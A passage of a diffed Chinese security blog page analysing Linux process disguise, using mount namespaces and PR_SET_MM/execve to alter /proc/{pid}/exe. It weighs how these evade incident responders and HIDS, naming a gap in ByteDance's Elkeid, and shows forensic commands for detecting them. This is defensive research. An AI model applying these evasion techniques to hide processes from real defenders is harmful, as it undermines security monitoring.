-<p>比如在上面例子中，宿主机上执行<code>mount</code>命令是是看不到”tmpfs文件系统被挂载在/tmp”目录下的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# mount | grep xx</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这种方式的对抗效果怎么样？</p>
-<p>可以从两个场景来评估”对抗效果”：</p>
-<blockquote>
-<p>1.和”应急分析人员”对抗：应急人员是否能够轻易发现异常？</p>
-<p>2.和”安全产品”对抗：安全产品是否能够轻易发现异常？安全产品的上报策略是否受此种方式影响？</p>
-</blockquote>
-<p>从”应急场景”的角度来看，应急分析人员如果很清楚<code>/proc/&#123;PID&#125;/exe</code>指向的文件不可信，可以通过 对比”可疑进程”和1号进程，验证mnt命名空间不同</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;proc&#x2F;31867&#x2F;ns&#x2F;mnt</span><br><span class="line">lrwxrwxrwx 1 root root 0 10月  1 23:42 &#x2F;proc&#x2F;31867&#x2F;ns&#x2F;mnt -&gt; mnt:[4026533456]</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt</span><br><span class="line">lrwxrwxrwx 1 root root 0 10月  1 23:43 &#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt -&gt; mnt:[4026531840]  &#x2F;&#x2F; 和 4026533456 不同</span><br></pre></td></tr></table></figure>
-
-<p>然后通过nsenter命令获取特定进程的挂载信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# nsenter -m -t 31867 mount|grep &#x2F;tmp</span><br><span class="line">xx on &#x2F;tmp type tmpfs (rw,relatime)</span><br></pre></td></tr></table></figure>
-
-<p>从”安全产品对抗”的角度来看，可以有以下结论：</p>
-<blockquote>
-<p>1.hids可以监控mount系统调用来发现异常；不过不是所有的agent都会监控mount系统调用，比如<a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/tree/main/driver">字节hids</a>就没有。</p>
-<p>2.hids上报文件时，如果是读取软链接指向的文件（比如案例中的/tmp/sleep，而不是/proc/31867/exe），就有可能上报错误的文件。</p>
-</blockquote>
-</li>
-</ul>
-<h1 id="修改软链接内容"><a href="#修改软链接内容" class="headerlink" title="修改软链接内容"></a>修改软链接内容</h1><ul>
-<li><p>怎么修改软链接内容？</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10235">Linux进程伪装：动态修改/proc/self/exe</a> 文章中总结了两种方法：</p>
-<blockquote>
-<p>1.execve函数</p>
-<p>2.prctl系统调用</p>
-</blockquote>
-<p>读者可直接阅读原文，这里我只记录一个自己看文章时的疑问：如果先创建线程A然后再调用execve，是否线程A还能继续执行？</p>
-<p>答案是不行。</p>
-<p>man 2 execve手册有说明：所有线程都被销毁</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note the following further points:</span><br><span class="line"></span><br><span class="line">  *  All threads other than the calling thread are destroyed during an execve().  Mutexes, condition variables, and other pthreads objects are not preserved.</span><br></pre></td></tr></table></figure>
-
-<p>自己测试了一下，可以验证”线程会被销毁”的结论。</p>
-<p><a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/277852e2e741eb24b0b4bb8dc0220ef2">测试代码</a>，运行结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vm10-50-0-18 ~]# gcc y.c -lpthread &amp;&amp; .&#x2F;a.out</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">[root@vm10-50-0-18 root]#</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这种方式的对抗效果怎么样？</p>
-<p>原文第一种execve方式，我不太清楚使用场景：既然都execve来替换程序了，为什么不直接退出程序呢？</p>
-<p>第二种”prctl系统调用”方式，对”应急响应人员”来说，迷惑性应该是很大的。对”hids产品”来说，prctl系统调用会是一个监控点。</p>
-<p>比如字节hids对prctl系统调用是有监控的，可以参考<a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/tree/main/driver">elkeid的系统调用hook列表</a>。不过目前只有prctl系统调用的参数是PR_SET_NAME时才上报数据。这里用到的是PR_SET_MM参数，所以会绕过字节hids。</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1002/235737_79fb7ace_83508.png" alt="图五" title="屏幕截图.png"></p>
-</li>
-<li><p>补充一种”修改软链接内容”的方式</p>
-<p>当使用<code>umount -l</code>卸载时，exe指向的路径也会修改，如下图</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/1018/212605_3229fb08_83508.png" alt="图六" title="屏幕截图.png"></p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从上面分析可以看到，”/proc/{pid}/exe”文件相关信息似乎是不可信的：</p>
-<ul>
-<li>“mount命名空间”会改变<code>/proc/&#123;pid&#125;/exe</code>对应文件的内容</li>
-<li>先知文章提到的两种方式会改变<code>/proc/&#123;pid&#125;/exe</code>指向的文件</li>
-</ul>
-<p>个人感觉：这两种方式都有可能导致hids文件上报出现问题，也可能给”应急人员”的分析过程造成一定阻力。</p>
-<p>但是如果直接<code>cat /proc/&#123;pid&#125;/exe</code>，就会发现仍然可以读到源二进制程序内容。</p>
-<p>那怎么让<code>/proc/&#123;pid&#125;/exe</code>也无法还原出二进制程序呢，这个问题留给读者思考。</p>
-<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
